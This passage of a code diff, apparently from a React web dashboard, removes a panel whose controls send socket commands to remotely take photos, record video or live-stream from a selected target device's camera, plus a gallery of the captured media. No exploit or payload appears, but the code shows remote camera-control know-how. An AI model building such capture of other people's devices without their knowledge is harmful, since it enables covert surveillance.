-                                                className={`flex-1 py-2 px-3 rounded-lg font-bold text-sm flex items-center justify-center gap-1.5 transition-all ${isLiveStreaming ? 'bg-red-600 text-white' : 'bg-cyan-600 text-white hover:bg-cyan-500'}`}
-                                                disabled={!selectedDeviceId || isRecording || isVideoUploading}
-                                            >
-                                                {isLiveStreaming ? '⏹ Stop' : '📹 Live'}
-                                            </button>
-
-                                            {/* SNAP */}
-                                            <button
-                                                onClick={() => {
-                                                    if (!selectedDeviceId) return;
-                                                    setIsCapturingPhoto(true);
-                                                    socket?.emit('capture_photo', { uuid: session?.user?.uuid, targetDeviceId: selectedDeviceId, camera: cameraMode });
-                                                }}
-                                                className="flex-1 py-2 px-3 rounded-lg bg-green-600 text-white font-bold text-sm flex items-center justify-center gap-1.5 hover:bg-green-500"
-                                                disabled={!selectedDeviceId || isCapturingPhoto || isLiveStreaming}
-                                            >
-                                                {isCapturingPhoto ? <span className="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin" /> : '📸'} Photo
-                                            </button>
-
-                                            {/* REC */}
-                                            {!isRecording ? (
-                                                <div className="flex-1 flex flex-col gap-1">
-                                                    <div className="flex gap-0.5 justify-center">
-                                                        {[{ label: '1m', value: 60 }, { label: '2m', value: 120 }, { label: '5m', value: 300 }].map((opt) => (
-                                                            <button
-                                                                key={opt.value}
-                                                                onClick={() => setRecordingDuration(opt.value)}
-                                                                className={`px-1.5 py-0.5 rounded text-xs font-bold ${recordingDuration === opt.value ? 'bg-orange-500 text-white' : 'bg-white/10 text-white/50'}`}
-                                                            >
-                                                                {opt.label}
-                                                            </button>
-                                                        ))}
-                                                    </div>
-                                                    <button
-                                                        onClick={() => {
-                                                            if (!selectedDeviceId) return;
-                                                            socket?.emit('start_recording', { uuid: session?.user?.uuid, targetDeviceId: selectedDeviceId, camera: cameraMode, duration: recordingDuration });
-                                                            setIsRecording(true);
-                                                            setRecordingProgress({ current: 0, total: recordingDuration });
-                                                        }}
-                                                        className="py-2 px-3 rounded-lg bg-orange-600 text-white font-bold text-sm flex items-center justify-center gap-1.5 hover:bg-orange-500"
-                                                        disabled={!selectedDeviceId || isLiveStreaming || isVideoUploading}
-                                                    >
-                                                        🎬 Rec
-                                                    </button>
-                                                </div>
-                                            ) : (
-                                                <button
-                                                    onClick={() => {
-                                                        socket?.emit('stop_recording', { uuid: session?.user?.uuid, targetDeviceId: selectedDeviceId });
-                                                        setIsRecording(false);
-                                                        setIsVideoUploading(true);
-                                                    }}
-                                                    className="flex-1 py-2 px-3 rounded-lg bg-red-600 text-white font-bold text-sm animate-pulse"
-                                                >
-                                                    ⏹ Stop ({recordingProgress.current}s)
-                                                </button>
-                                            )}
-                                        </div>
-                                    )}
-                                </div>
-                            </div>
-
-                            {/* Captured Media Gallery */}
-                            {capturedMedia.length > 0 && (
-                                <div className="bg-white/5 border border-white/10 p-3 rounded-xl">
-                                    <div className="flex justify-between items-center mb-3">
-                                        <span className="text-sm text-white/60 font-mono">{capturedMedia.length} Captures</span>
-                                        <button onClick={() => setCapturedMedia([])} className="text-xs text-white/40 hover:text-white">Clear</button>
-                                    </div>
-                                    <div className="grid grid-cols-3 sm:grid-cols-4 lg:grid-cols-5 gap-2">
-                                        {capturedMedia.map((media, i) => {
-                                            const isUrl = media.data.startsWith('/') || media.data.startsWith('http');
-                                            const src = isUrl
-                                                ? (media.data.startsWith('http') ? media.data : `https://backend-api-gallery.onrender.com${media.data}`)
-                                                : media.type === 'video' ? `data:video/mp4;base64,${media.data}` : `data:image/jpeg;base64,${media.data}`;
-
-                                            return (
-                                                <div
-                                                    key={i}
-                                                    onClick={() => setPreviewCapture({ type: media.type, data: src })}
-                                                    className="group relative aspect-square bg-black rounded-lg overflow-hidden border border-white/10 cursor-pointer hover:border-white/30"
-                                                >
-                                                    {media.type === 'photo' ? (
-                                                        <img src={src} className="w-full h-full object-cover" alt="" />
-                                                    ) : (
-                                                        <div className="relative w-full h-full">
-                                                            <video src={src} className="w-full h-full object-cover" />
-                                                            <div className="absolute inset-0 flex items-center justify-center bg-black/40">
-                                                                <span className="text-white text-lg">▶</span>
-                                                            </div>
-                                                        </div>
-                                                    )}
-                                                    <div className="absolute bottom-0 left-0 right-0 bg-black/60 px-1 py-0.5 text-[10px] text-white/60 text-center">
-                                                        {new Date(media.timestamp).toLocaleTimeString()}
-                                                    </div>
-                                                </div>
-                                            );
-                                        })}
-                                    </div>
-                                </div>
-                            )}
-
-                            {/* Preview Modal */}
-                            {previewCapture && (
-                                <div
-                                    className="fixed inset-0 z-50 bg-black/90 flex items-center justify-center p-4"
-                                    onClick={() => setPreviewCapture(null)}
-                                >
-                                    <button className="absolute top-4 right-4 text-white p-2 hover:bg-white/10 rounded-full">
-                                        <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M6 18L18 6M6 6l12 12"></path></svg>
-                                    </button>
-                                    {previewCapture.type === 'photo' ? (
-                                        <img src={previewCapture.data} className="max-w-full max-h-[90vh] object-contain rounded-lg" alt="Preview" />
-                                    ) : (
-                                        <video src={previewCapture.data} controls autoPlay className="max-w-full max-h-[90vh] rounded-lg" />
-                                    )}
-                                </div>
-                            )}
-                        </div>
-                    )}
                 </div>
 
-                {selectedTool === 'gallery' && (
+                {selectedTool === 'gallery' && selectedDeviceId && (
                     <>
                         <div className="flex flex-col md:flex-row md:items-center justify-between mb-6 gap-4">
                             <h2 className="text-2xl font-bold">Your Gallery</h2>
